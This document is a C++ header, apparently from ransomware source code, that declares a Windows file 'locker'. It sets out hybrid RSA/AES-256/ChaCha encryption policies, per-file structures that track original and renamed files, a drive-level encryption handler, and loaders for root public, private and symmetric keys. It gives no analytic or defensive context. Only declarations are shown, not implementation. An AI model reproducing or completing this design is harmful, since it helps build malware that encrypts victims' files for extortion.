#ifndef _LOCKER_H_
#define _LOCKER_H_

#include <windows.h>
#include "macro.h"
#include "pathsystem.h"
#include "chacha20/ecrypt-sync.h"
#include "aes/aes256.h"

enum GenPolicy
{
	NONE,
	GENKEY_ONCE,
	GENKEY_EVERY_ONCE
};

enum CryptoPolicy
{
	AES256 = 101,
	CHACHA = 102,
	RSA_AES256 = 103,
	RSA_CHACHA = 104,
	RSA = 150
};

typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int64_t* padding, BYTE* buff1, BYTE* buff2, u32 bytes);
typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
typedef BOOL (*EncryptAlgoMethod)(void* FileInfo);


namespace locker
{
	typedef struct HashList
	{		
		BYTE* hash;
		size_t hash_size;
		SLIST_ENTRY(HashList);
	} *PHLIST, HLIST;

	struct descriptor
	{
		BYTE* key_data;
		WCHAR* rsa_path;
		DWORD size;
		BCRYPT_ALG_HANDLE crypto_provider;
		BCRYPT_KEY_HANDLE handle_rsa_key;
	};

	typedef struct CryptCTXInfo
	{		
		VOID* ctx;
		descriptor desc;
		CONST CHAR* name;		
		u32 mode;
		CryptoPolicy method_policy;
		GenPolicy gen_policy;
		EncryptMethodFunc crypt_method;
		EncryptGenKeyFunc gen_key_method;
		EncryptAlgoMethod algo_method;
	} CRYPT_INFO, * PCRYPT_INFO;

	typedef struct file_info
	{
		VOID* ctx;
		PCRYPT_INFO CryptInfo;
		LPCWSTR Filename;
		WCHAR* newFilename;
		LPCWSTR FilePath;
		HANDLE FileHandle;
		HANDLE newFileHandle;
		LONGLONG Filesize;
		int64_t	padding;
	}FILE_INFO, * PFILE_INFO;
	
	typedef struct CryptoSystem
	{
		crypto_aes_ctx	aes_ctx;
		laced_ctx		chacha_ctx;
		CryptCTXInfo	alg[5];
		u32				num;
	}CRYPTO_SYSTEM;

	
	VOID FreeCryptInfo(CRYPT_INFO* CryptInfo);
	BOOL GeneratePolicy(CRYPT_INFO* CryptInfo);
	VOID CryptoSystemInit(CRYPTO_SYSTEM* sys);

	BOOL HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data, SLIST<HLIST>* HashList);

	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
	VOID LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV);
}

typedef locker::HLIST HASH_LIST;
typedef locker::HLIST* PHASH_LIST;
typedef locker::FILE_INFO FILE_INFO;
typedef locker::PFILE_INFO PFILE_INFO;
typedef locker::CryptCTXInfo CRYPT_INFO;
typedef locker::FILE_INFO FILE_INFO;
typedef locker::CryptoSystem CRYPTO_SYSTEM;
typedef locker::HLIST HLIST;

#endif